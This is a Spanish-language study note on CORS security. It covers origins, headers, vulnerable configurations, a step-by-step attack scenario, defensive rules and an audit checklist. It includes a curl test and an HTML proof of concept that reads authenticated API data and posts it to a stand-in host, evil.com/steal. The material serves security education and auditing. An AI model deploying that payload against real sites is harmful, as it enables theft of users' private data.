## 📚 Índice

- [[#📌 ¿Qué es CORS?]]
- [[#🚨 Headers CORS importantes]]
- [[#❌ Configuraciones CORS Vulnerables]]
- [[#🎯 Escenario de Ataque Real (Paso a Paso)]]
- [[#☠️ Explotación con HTML malicioso]]
- [[#🧠 Reglas de Oro (Defensivo)]]
- [[#📎 Checklist de Auditoría CORS]]


## 📌 ¿Qué es CORS?

**CORS (Cross-Origin Resource Sharing)** es un mecanismo de seguridad implementado por los **navegadores**, no por los servidores, que controla **qué orígenes externos pueden acceder a recursos de un servidor** mediante peticiones HTTP.

> CORS **no protege al servidor**, protege al **usuario** desde el navegador.

Sin CORS, cualquier sitio podría leer respuestas sensibles de otros dominios usando JavaScript.

---

## 🧠 Concepto de Origen (Origin)

Un **origen** está compuesto por:

```
scheme://host:port
```

Ejemplo:

- `https://example.com`
    
- `https://api.example.com` ❌ (origen distinto)
    
- `http://example.com` ❌
    
- `https://example.com:8080` ❌
    

---

## 🛡️ Same-Origin Policy (SOP)

Por defecto, el navegador **bloquea**:

- Lectura de respuestas
    
- Acceso a cookies
    
- Acceso a tokens
    

cuando una petición se hace desde **otro origen**.

👉 **CORS es una excepción controlada a SOP**.

---

## 📤 Flujo básico de CORS

1. El navegador envía una petición con:
    
    ```
    Origin: https://example.com
    ```
    
2. El servidor responde con:
    
    ```
    Access-Control-Allow-Origin: https://example.com
    ```
    
3. Si coincide → el navegador **permite** el acceso a la respuesta  
    Si no coincide → **bloqueo del navegador**
    

---

## 🚨 Headers CORS importantes

### 🔹 Access-Control-Allow-Origin

Define qué orígenes pueden acceder al recurso.

Valores comunes:

```
*
https://example.com
null
```

---

### 🔹 Access-Control-Allow-Credentials

Permite enviar cookies / headers de autenticación.

```
Access-Control-Allow-Credentials: true
```

⚠️ **Nunca debe usarse con `*`**

---

### 🔹 Access-Control-Allow-Methods

Métodos permitidos:

```
GET, POST, PUT, DELETE
```

---

### 🔹 Access-Control-Allow-Headers

Headers personalizados permitidos:

```
Authorization, Content-Type
```

---

## 🔍 Preflight Requests (OPTIONS)

Cuando una petición es considerada **no simple**, el navegador envía antes:

```
OPTIONS /endpoint
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```

El servidor decide si permite o no la petición real.

---

## ❌ Configuraciones CORS Vulnerables

### ⚠️ 1. Access-Control-Allow-Origin: *

```
Access-Control-Allow-Origin: *
```

🚫 Vulnerable **solo si**:

```
Access-Control-Allow-Credentials: true
```

👉 Permite leer respuestas **autenticadas** desde cualquier dominio.

---

### ⚠️ 2. Reflejo del Origin (Reflection)

El servidor **refleja el valor del Origin** sin validarlo:

```
Origin: https://evil.com
```

Respuesta:

```
Access-Control-Allow-Origin: https://evil.com
```

🔥 **Vulnerabilidad crítica**

---

### ⚠️ 3. Validación débil por substring

Ejemplos inseguros:

- `endsWith("example.com")`
    
- `contains("example.com")`
    

Permite:

```
evil-example.com
example.com.attacker.com
```

---

### ⚠️ 4. Origin: null permitido

```
Access-Control-Allow-Origin: null
```

Permite ataques desde:

- Sandboxed iframes
    
- `file://`
    
- documentos locales
    

---

## 🎯 Escenario de Ataque Real (Paso a Paso)

### 🧩 Contexto

- API vulnerable: `https://api.example.com/user`
    
- Usuario autenticado (cookies activas)
    
- CORS mal configurado
    

---

### 🧪 Prueba manual con curl

```bash
curl -i https://api.example.com/user \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=valid"
```

Si responde:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

👉 **Explotable desde navegador**

---

## ☠️ Explotación con HTML malicioso

```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://api.example.com/user", {
  credentials: "include"
})
.then(res => res.text())
.then(data => {
  fetch("https://evil.com/steal", {
    method: "POST",
    body: data
  });
});
</script>
</body>
</html>
```

📌 El navegador:

- Envía cookies automáticamente
    
- Permite leer la respuesta
    
- Filtra los datos al atacante
    

---

## 🛠️ Automatización de pruebas

### 🔹 Burp Suite

- **Proxy → Repeater**
    
- Modificar `Origin`
    
- Analizar headers CORS
    

---

### 🔹 Herramientas útiles

- **Corsy**
    
- **Burp Scanner**
    
- **Postman**
    
- **curl**
    

---

## 🧠 Reglas de Oro (Defensivo)

✅ Validar el `Origin` contra una **lista blanca exacta**  
❌ Nunca usar `*` con credentials  
❌ No reflejar dinámicamente el Origin  
❌ No confiar en regex débiles  
❌ No permitir `null`

---

## 🧬 CORS ≠ Autorización

> **CORS NO reemplaza controles de autorización**

Aunque CORS esté bien:

- El backend **debe validar permisos**
    
- Tokens y roles deben verificarse
    

---

## 🧠 Mentalidad Hacker

- CORS es un **problema de lógica**, no de código
    
- El fallo suele estar en **configuración**
    
- Impacto alto: **account takeover, data exfiltration**
    

---

## 📎 Checklist de Auditoría CORS

-  ¿Refleja el Origin?
    
-  ¿Permite `*`?
    
-  ¿Permite credentials?
    
-  ¿Valida subdominios correctamente?
    
-  ¿Permite `null`?
    
-  ¿Hay endpoints sensibles accesibles?
    

---

## 🔥 Conclusión

CORS mal configurado es una de las **vulnerabilidades más subestimadas**, pero con **impacto crítico**.  
No rompe el servidor, rompe la **confianza del navegador**.

> Si puedes controlar el `Origin`, **controlas el acceso**.

---

